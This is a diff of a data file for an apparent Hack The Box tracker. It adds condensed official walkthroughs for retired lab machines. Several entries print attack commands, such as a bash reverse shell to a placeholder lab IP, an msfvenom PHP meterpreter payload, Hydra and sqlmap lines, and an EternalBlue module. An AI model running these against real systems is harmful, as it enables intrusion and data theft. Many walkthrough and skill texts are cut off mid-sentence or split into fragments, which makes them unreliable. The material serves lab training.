+    "hint": "Mantis can definitely be one of the more challenging machines for some users. For successful exploitation, a fair bit of knowledge or research of Windows Servers and the domain controller system is required.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-09-16T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Mantis can definitely be one of the more challenging machines for some users. For successful exploitation, a fair bit of knowledge or research of Windows Servers and the domain controller system is required.",
+    "skillsLearned": [
+      "Enumerating SQL Server Express",
+      "databases",
+      "Exploiting domain controllers and",
+      "Kerberos"
+    ],
+    "officialPdf": "98-Mantis_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMantis can definitely be one of the more challenging machines for some users. For successful exploitation, a fair bit of knowledge or research of Windows Servers and the domain controller system is required.\n\n### 🎯 Core Skills\n- **Enumerating SQL Server Express**\n- **databases**\n- **Exploiting domain controllers and**\n- **Kerberos**\n\n### ⚔️ Foothold Vector\n, a fair bit of knowledge or research of Windows Servers and the domain controller system is required. Skills Required ● Intermediate/advanced knowledge of Windows Server ● Knowledge of domain controllers Skills Learned ● Enumerating SQL Server Express databases ● Exploiting domain controllers and Kerberos"
   },
   {
     "id": "htb-solidstate",
@@ -10329,15 +12854,30 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Chaining-vulnerabilities",
+      "Enumerating-POP-servers",
+      "Exploiting-Apache-James",
+      "Exploiting-world",
+      "HTB",
+      "writable-files"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/solidstate",
     "writeupUrl": "https://0xdf.gitlab.io/tags#solidstate",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-09-08T19:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required.",
+    "skillsLearned": [
+      "Exploiting Apache James",
+      "Enumerating POP servers",
+      "Chaining vulnerabilities",
+      "Exploiting world",
+      "writable files"
+    ],
+    "officialPdf": "85-SolidState_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required.\n\n### 🎯 Core Skills\n- **Exploiting Apache James**\n- **Enumerating POP servers**\n- **Chaining vulnerabilities**\n- **Exploiting world**\n- **writable files**\n\n### ⚔️ Foothold Vector\nApache James Exploit: https://www.exploit-db.com/exploits/35513/ Looking into Apache James 2.3.2, there is a remote code execution vulnerability, however it requires valid credentials. Luckily, the server has the default credentials used in the proof of concept. Modification of the exploit is very straight forward. Simply change the the payload variable to create a reverse connection. The easiest way is with bash -i >& /dev/tcp/<LAB IP>/<PORT> 0>&1 The exploit will trigger as soon as a user logs on to the system. By connecting via telnet as the\n\n### 👑 Privilege Escalation\nuser, it is possible to change the credentials of other accounts. After changing the mindy user's password with setpassword mindy writeup, it is possible to telnet into the POP server and read emails. Once connected with telnet 10.10.10.51 110, entering USER mindy and PASS writeup will gain access. The commands LIST and RETR 2 will list and view the user's emails, and in the process expose valid SSH credentials for the mindy user. Logging in via SSH will trigger the remote code execution exploit and grant an unrestricted user shell through the previously set up payload."
   },
   {
     "id": "htb-mirai",
@@ -10348,15 +12888,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Forensic-file-recovery",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/mirai",
     "writeupUrl": "https://0xdf.gitlab.io/tags#mirai",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide va",
     "timeSpentSeconds": 0,
     "createdAt": "2017-09-01T19:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors.",
+    "skillsLearned": [
+      "Identifying an IoT device",
+      "Forensic file recovery"
+    ],
+    "officialPdf": "64-Mirai_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors.\n\n### 🎯 Core Skills\n- **Identifying an IoT device**\n- **Forensic file recovery**\n\n### ⚔️ Foothold Vector\nKnowing the target operating system and device, while keeping in mind how the Mirai botnet operates, it can be assumed that the default user credentials have been unchanged. A quick search reveals that the default Raspbian credentials are pi:raspberry. Connecting via SSH with these credentials immediately gives full access to the device, as the default configuration for Raspbian has the pi user as part of the sudoers group. From here the user flag can be obtained from /home/pi/Desktop/user.txt. Upon closer inspection, the\n\n### 👑 Privilege Escalation\nflag is not in its typical location. Instead, the root.txt files presents the message \"I lost my original root.txt! I think I may have a backup on my USB stick...\""
   },
   {
     "id": "htb-shrek",
@@ -10367,15 +12915,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Enumerating-hidden-tasks",
+      "HTB",
+      "Spectrogram-analysis",
+      "curve-cryptography"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/shrek",
     "writeupUrl": "https://0xdf.gitlab.io/tags#shrek",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Shrek, while not the most realistic machine, touches on many different subjects and is definitely one of the more challenging machines on Hack The Box. This machine features several fairly uncommon topics and requires a fair bit of research to complete.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-08-25T19:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Shrek, while not the most realistic machine, touches on many different subjects and is definitely one of the more challenging machines on Hack The Box. This machine features several fairly uncommon topics and requires a fair bit of research to complete.",
+    "skillsLearned": [
+      "Spectrogram analysis",
+      "Recognizing and decrypting elliptic",
+      "curve cryptography",
+      "Enumerating hidden tasks",
+      "Exploiting chown wildcards"
+    ],
+    "officialPdf": "58-Shrek_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nShrek, while not the most realistic machine, touches on many different subjects and is definitely one of the more challenging machines on Hack The Box. This machine features several fairly uncommon topics and requires a fair bit of research to complete.\n\n### 🎯 Core Skills\n- **Spectrogram analysis**\n- **Recognizing and decrypting elliptic**\n- **curve cryptography**\n- **Enumerating hidden tasks**\n- **Exploiting chown wildcards**\n\n### ⚔️ Foothold Vector\nSteganography Using Sonic Visualiser (apt-get install sonic-visualiser) on the mp3 file and viewing the spectrogram (Pane > Add Spectrogram) reveals some FTP credentials.\n\n### 👑 Privilege Escalation\nExploit: https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt Depending on the escalation enumeration script used, the correct attack vector may be fairly challenging to locate. The /usr/src folder is writeable for the sec user and contains a thoughts.txt file owned by root. Attempting to create a file will reveal (after a bit of a delay) that there is a scheduled task which runs chown * in the directory. Using the above exploit, it is possible to force chown to use a reference file and apply the owner:group of that file to everything in the directory. The command touch -- --reference=thoughts."
   },
   {
     "id": "htb-apocalyst",
@@ -10386,15 +12947,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Basic-steganograpy",
+      "HTB",
+      "HTTP",
+      "Wordlist-generation",
+      "based-brute-forcing"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/apocalyst",
     "writeupUrl": "https://0xdf.gitlab.io/tags#apocalyst",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Apocalyst is a fairly straightforward machine, however it requires a wide range of tools and techniques to complete. It touches on many different topics and can be a great learning resource for many.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-08-18T19:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Apocalyst is a fairly straightforward machine, however it requires a wide range of tools and techniques to complete. It touches on many different topics and can be a great learning resource for many.",
+    "skillsLearned": [
+      "Wordlist generation",
+      "HTTP",
+      "based brute forcing",
+      "Basic steganograpy",
+      "Exploiting permissive system files"
+    ],
+    "officialPdf": "57-Apocalyst_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nApocalyst is a fairly straightforward machine, however it requires a wide range of tools and techniques to complete. It touches on many different topics and can be a great learning resource for many.\n\n### 🎯 Core Skills\n- **Wordlist generation**\n- **HTTP**\n- **based brute forcing**\n- **Basic steganograpy**\n- **Exploiting permissive system files**\n\n### ⚔️ Foothold Vector\nSteghide Saving the image from Rightiousness and running steghide against it with a blank passphrase will output a list.txt file, which is a list of random words of varying languages. Command: steghide extract -sf apocalyst.jpg\n\n### 👑 Privilege Escalation\n/Desktop/writeups/apocalyst/list.txt --username falaraki Note: the full path to the wordlist must be provided"
   },
   {
     "id": "htb-nineveh",
@@ -10405,15 +12980,30 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Chaining-exploits",
+      "HTB",
+      "HTTP",
+      "Local-file-inclusion",
+      "Port-knocking",
+      "based-brute-forcing"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/nineveh",
     "writeupUrl": "https://0xdf.gitlab.io/tags#nineveh",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Nineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine, and some research is required to enumerate them.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-08-04T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Nineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine, and some research is required to enumerate them.",
+    "skillsLearned": [
+      "HTTP",
+      "based brute forcing",
+      "Chaining exploits",
+      "Local file inclusion",
+      "Port knocking"
+    ],
+    "officialPdf": "54-Nineveh_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine, and some research is required to enumerate them.\n\n### 🎯 Core Skills\n- **HTTP**\n- **based brute forcing**\n- **Chaining exploits**\n- **Local file inclusion**\n- **Port knocking**\n\n### ⚔️ Foothold Vector\nphpLiteAdmin Exploit: https://www.exploit-db.com/exploits/24044/ A bit of searching turns up a remote code execution vulnerability in phpLiteAdmin, however it requires authentication. Running Hydra against the login with the rockyou.txt wordlist is successful. Command: hydra -l none -P rockyou.txt 10.10.10.43 https-post-form \"/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password\" -t 64 -V Using the exploit described in exploit-db 24044 is trivial. Simply creating a database named ninevehNotes.txt.writeup.php (view next section for more information), adding a table, then inserting a table entry with the PHP payload is all that is required.\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LinEnum locates a bash script at /usr/sbin/report-reset.sh. The script removes files in the /reports/ directory. Reviewing a report file and searching some of the static strings reveals that it was created by chkrootkit. Searching for chkrootkit vulnerabilities finds exploit-db 33899. The file /tmp/update is executed by ckhrootkit as root. As this file does not currently exist, it is possible to put a bash script in its place and use it to extract the root flag. Exploit: https://www.exploit-db.com/exploits/33899/"
   },
   {
     "id": "htb-blue",
@@ -10429,7 +13019,7 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/blue",
     "writeupUrl": "https://0xdf.gitlab.io/tags#blue",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-07-28T16:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10438,7 +13028,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.",
+    "skillsLearned": [
+      "Identifying Windows targets using SMB",
+      "Exploit modification (optional)"
+    ],
+    "officialPdf": "51-Blue_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBlue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.\n\n### 🎯 Core Skills\n- **Identifying Windows targets using SMB**\n- **Exploit modification (optional)**\n\n### ⚔️ Foothold Vector\nMetasploit Exploitation is very straight forward. The exploit/windows/smb/ms17_010_eternalblue Metasploit module will immediately grant a\n\n### 👑 Privilege Escalation\nshell. Grab the flags from c:\\Users\\haris\\Desktop\\user.txt.txt and c:\\Users\\Administrator\\Desktop\\root.txt.txt"
   },
   {
     "id": "htb-blocky",
@@ -10449,12 +13046,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
+      "Basic-local-Linux",
+      "CVE-2017-6074",
+      "Decompiling-JAR-files",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/blocky",
     "writeupUrl": "https://0xdf.gitlab.io/tags#blocky",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-07-21T16:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10463,7 +13063,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators.",
+    "skillsLearned": [
+      "Exploiting bad password practices",
+      "Decompiling JAR files",
+      "Basic local Linux"
+    ],
+    "officialPdf": "48-Blocky_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBlocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators.\n\n### 🎯 Core Skills\n- **Exploiting bad password practices**\n- **Decompiling JAR files**\n- **Basic local Linux**\n\n### 🛡️ Associated CVEs\n`CVE-2017-6074`\n\n### ⚔️ Foothold Vector\nLooking at the jar files, griefprevention is an open source plugin that is freely available. BlockyCore, however, appears to be created by the server administrator, as its title relates directly to the server. Decompiling with JD-GUI exposes the credentials for the\n\n### 👑 Privilege Escalation\nMySQL user. While possible to login to PHPMyAdmin with these credentials, it is not the intended method for initial access. The PHPMyAdmin route is far more complex, and involves changing the Wordpress administrator password, creating a reverse PHP shell and escalating from the www-data user via the DCCP Double-Free technique (CVE-2017-6074). The intended method for this machine is a simple username and password reuse. Attempting to connect via SSH to the notch user (username discovered in the Wordpress post) and supplying the MySQL root password gives immediate access."
   },
   {
     "id": "htb-jail",
@@ -10474,15 +13082,32 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
+      "Enumerating-NFS-shares",
+      "Escaping-SELinux-sandbox",
+      "Escaping-rvim",
+      "Exploiting-NOPASSWD",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/jail",
     "writeupUrl": "https://0xdf.gitlab.io/tags#jail",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Jail, like the name implies, involves escaping multiple sandbox environments and escalating between multiple user accounts. It is definitely one of the more challenging machines on Hack The Box and requires fairly advanced knowledge in several areas to complete.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-07-14T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Jail, like the name implies, involves escaping multiple sandbox environments and escalating between multiple user accounts. It is definitely one of the more challenging machines on Hack The Box and requires fairly advanced knowledge in several areas to complete.",
+    "skillsLearned": [
+      "Enumerating NFS shares",
+      "Exploiting buffer overflows",
+      "Escaping SELinux sandbox",
+      "Exploiting NOPASSWD",
+      "Escaping rvim",
+      "Generating targeted wordlists",
+      "Cracking encrypted RAR archives",
+      "Exploiting weak RSA public keys"
+    ],
+    "officialPdf": "45-Jail_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nJail, like the name implies, involves escaping multiple sandbox environments and escalating between multiple user accounts. It is definitely one of the more challenging machines on Hack The Box and requires fairly advanced knowledge in several areas to complete.\n\n### 🎯 Core Skills\n- **Enumerating NFS shares**\n- **Exploiting buffer overflows**\n- **Escaping SELinux sandbox**\n- **Exploiting NOPASSWD**\n- **Escaping rvim**\n- **Generating targeted wordlists**\n- **Cracking encrypted RAR archives**\n- **Exploiting weak RSA public keys**\n\n### ⚔️ Foothold Vector\n. To start, Apache and an unknown service on port 7411 are the most important.\n\n### 👑 Privilege Escalation\nSELinux Sandbox (frank) Exploit: http://seclists.org/oss-sec/2016/q3/606 NFSShell: https://github.com/NetDirect/nfsshell Escaping the sandbox can be quite tricky for many users that do not have experience with sandboxed environments. Using NFSShell to connect to the share with the commands host 10.10.10.34 and mount /var/nfsshare allows for uploading and minor file modifications. After modifying the above exploit to copy an SSH key from the share to /home/frank/.ssh/authorized_keys, it is possible to place the exploit binary and an SSH key on the target."
   },
   {
     "id": "htb-charon",
@@ -10493,15 +13118,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploiting-SUID-files",
+      "HTB",
+      "Shell-command-injection",
+      "injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/charon",
     "writeupUrl": "https://0xdf.gitlab.io/tags#charon",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Charon is definitely one of the more challenging machines on HackTheBox. It does not require any advanced techniques, however there are many subtle tricks needed at almost every step of exploitation.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-07-07T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Charon is definitely one of the more challenging machines on HackTheBox. It does not require any advanced techniques, however there are many subtle tricks needed at almost every step of exploitation.",
+    "skillsLearned": [
+      "Bypassing filtering to achieve SQL",
+      "injection",
+      "Exploiting PHP image uploads",
+      "Exploiting SUID files",
+      "Shell command injection"
+    ],
+    "officialPdf": "42-Charon_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCharon is definitely one of the more challenging machines on HackTheBox. It does not require any advanced techniques, however there are many subtle tricks needed at almost every step of exploitation.\n\n### 🎯 Core Skills\n- **Bypassing filtering to achieve SQL**\n- **injection**\n- **Exploiting PHP image uploads**\n- **Exploiting SUID files**\n- **Shell command injection**\n\n### ⚔️ Foothold Vector\n. Skills Required ● Intermediate knowledge of Linux ● Intermediate/advanced understanding of SQL injections Skills Learned ● Bypassing filtering to achieve SQL injection ● Exploiting PHP image uploads ● Exploiting SUID files ● Shell command injection\n\n### 👑 Privilege Escalation\nUser RsaCtfTool: https://github.com/Ganapati/RsaCtfTool Once a shell is obtained, continue by exfiltrating the files /home/decoder/pass.crypt and /home/decoder/decoder.pub. The pass.crypt file is encrypted using a weak RSA key and can be decrypted using RsaCtfTool. Command: RsaCtfTool.py --publickey decoder.pub --uncipher pass.crypt Decrypting the file reveals the password for the decoder user. SSH in as decoder to complete the first privilege escalation. The user flag can be obtained from /home/decoder/user.txt"
   },
   {
     "id": "htb-calamity",
@@ -10512,15 +13150,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "mechanisms"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/calamity",
     "writeupUrl": "https://0xdf.gitlab.io/tags#calamity",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Calamity, while not over challenging to an initial foothold on, is deceivingly difficult. The privilege escalation requires advanced memory exploitation, having to bypass many protections put in place.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-06-30T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Calamity, while not over challenging to an initial foothold on, is deceivingly difficult. The privilege escalation requires advanced memory exploitation, having to bypass many protections put in place.",
+    "skillsLearned": [
+      "Bypassing process restrictions",
+      "Bypassing multiple memory protection",
+      "mechanisms",
+      "Exploiting binaries in multiple stages"
+    ],
+    "officialPdf": "37-Calamity_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCalamity, while not over challenging to an initial foothold on, is deceivingly difficult. The privilege escalation requires advanced memory exploitation, having to bypass many protections put in place.\n\n### 🎯 Core Skills\n- **Bypassing process restrictions**\n- **Bypassing multiple memory protection**\n- **mechanisms**\n- **Exploiting binaries in multiple stages**\n\n### ⚔️ Foothold Vector\non, is deceivingly difficult. The privilege escalation requires advanced memory exploitation, having to bypass many protections put in place. Skills Required ● Advanced Linux knowledge ● Advanced knowledge of memory exploitation and Linux memory analysis Skills Learned ● Bypassing process restrictions ● Bypassing multiple memory protection mechanisms ● Exploiting binaries in multiple stages\n\n### 👑 Privilege Escalation\nAudio Files (xalvas) In /home/xalvas there is a recov.wav file. There is also an alarmclocks directory which contains a rick.wav file. By importing both files into Audacity, or a similar program, and inverting one of the tracks, a password is revealed. The password audio is cut in half, with the start of the password being at the end of the track. Simply playing the track on a loop will provide the full password. It is possible to SSH in directly as the xalvas user with the obtained password (18547936..*)"
   },
   {
     "id": "htb-europa",
@@ -10531,15 +13179,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Apache-virtual-hosts",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/europa",
     "writeupUrl": "https://0xdf.gitlab.io/tags#europa",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Europa can present a bit of a challenge, or can be quite easy, depending on if you know what to look for. While it does not require many steps to complete, it provides a great learning experience in several fairly uncommon",
     "timeSpentSeconds": 0,
     "createdAt": "2017-06-23T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Europa can present a bit of a challenge, or can be quite easy, depending on if you know what to look for. While it does not require many steps to complete, it provides a great learning experience in several fairly uncommon",
+    "skillsLearned": [
+      "Enumerating SSL certificates and",
+      "Apache virtual hosts",
+      "Exploiting PHP's preg_replace function",
+      "Bypassing restrictive write permissions"
+    ],
+    "officialPdf": "27-Europa_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nEuropa can present a bit of a challenge, or can be quite easy, depending on if you know what to look for. While it does not require many steps to complete, it provides a great learning experience in several fairly uncommon\n\n### 🎯 Core Skills\n- **Enumerating SSL certificates and**\n- **Apache virtual hosts**\n- **Exploiting PHP's preg_replace function**\n- **Bypassing restrictive write permissions**\n\n### ⚔️ Foothold Vector\nLogin Page After a bit of trial and error, it is clear that the login page is vulnerable to SQL injection. Running SQLMap against the page will dump the password MD5 hashes and usernames. The hashes can easily be looked up with an online hash lookup such as hashkiller.co.uk Command: sqlmap -u \"https://admin-portal.europacorp.htb/login.php\" --data \"email=admin@europacorp.htb&password=\" --risk=3 --level=3 --dbms \"MYSQL\" --dump-all\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum As it is not possible to write to the web directory, even as www-data, the /tmp directory remains unrestricted. Uploading and running LinEnum gathers a large amount of information about the target. Looking at /etc/crontab, it appears that /var/www/cronjobs/clearlogs is run every minute. Examining the clearlogs file shows that /var/www/cmd/logcleared.sh is executed by this PHP script. The logcleared.sh file does not exist however, and the directory is writable by www-data. By creating a script and naming it logcleared.sh, it is possible to extract the root flag. Don't forget to chmod +x the script!"
   },
   {
     "id": "htb-bank",
@@ -10550,12 +13208,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
+      "Exploiting-SUID-files",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bank",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bank",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Bank is a relatively simple machine, however proper web",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-06-16T16:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10564,7 +13223,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Bank is a relatively simple machine, however proper web",
+    "skillsLearned": [
+      "Identifying vulnerable services",
+      "Exploiting SUID files"
+    ],
+    "officialPdf": "26-Bank_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBank is a relatively simple machine, however proper web\n\n### 🎯 Core Skills\n- **Identifying vulnerable services**\n- **Exploiting SUID files**\n\n### ⚔️ Foothold Vector\nIntended Method Upon closer inspection, it becomes apparent that one of the files is much smaller than the others. Opening 68576f20e9732f1b2edc4df5b8533230.acc reveals valid login credentials due to a failed encryption. Using the credentials to log in, it appears that there is a file upload form on the Support page. Inspecting the source code reveals that any file uploaded with the extension .htb is executed as PHP. It is trivial to get a shell at this stage. Generate a reverse PHP shell with msfvenom -p php/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f raw > writeup.htb and upload it using the form.\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LinEnum reveals a non-standard SUID file; /var/htb/bin/emergency. Running the file immediately grants root privileges. The flags can be obtained from /home/chris/user.txt and /root/root.txt"
   },
   {
     "id": "htb-holiday",
@@ -10575,15 +13241,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "Bypassing-XSS-filtering",
+      "Exploiting-NPM-CLI",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/holiday",
     "writeupUrl": "https://0xdf.gitlab.io/tags#holiday",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-06-02T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.",
+    "skillsLearned": [
+      "Bypassing user agent filtering",
+      "Bypassing XSS filtering",
+      "Obtaining data with stored XSS",
+      "Exploiting NOPASSWD files",
+      "Exploiting NPM CLI"
+    ],
+    "officialPdf": "22-Holiday_HTB_Official_writeup_Tamarisk.pdf",
